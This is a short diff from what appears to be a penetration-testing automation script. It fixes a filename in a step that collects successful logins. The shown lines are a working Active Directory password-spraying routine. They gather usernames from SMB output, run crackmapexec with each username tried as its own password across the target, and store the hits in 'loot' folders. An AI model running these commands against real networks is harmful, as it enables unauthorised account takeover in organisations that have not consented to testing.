@@ -166,7 +166,7 @@ echo 'HASH is untested'
    awk '/445/ {print$5}' /root/output/list/raw.txt | cut -d '\' -f 2 | grep -v 'HealthMailbox' | sed '/\x1b\[[0-9;]*[mGKHF]/d' > /root/output/list/user.txt
    rm /root/output/list/raw.txt
    crackmapexec smb $IP -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >> /root/output/loot/intern/ad/iam/username_as_pass/raw_$DOM.txt
-   grep '+' /root/output/loot/intern/ad/iam/username_as_pass/raw.txt > /root/output/loot/intern/ad/iam/username_as_pass/user_$DOM.txt
+   grep '+' /root/output/loot/intern/ad/iam/username_as_pass/raw_$DOM.txt > /root/output/loot/intern/ad/iam/username_as_pass/user_$DOM.txt
  # keep the raw file for screens and debugging
 
   echo "Pass-Pol" >> /root/output/runtime.txt
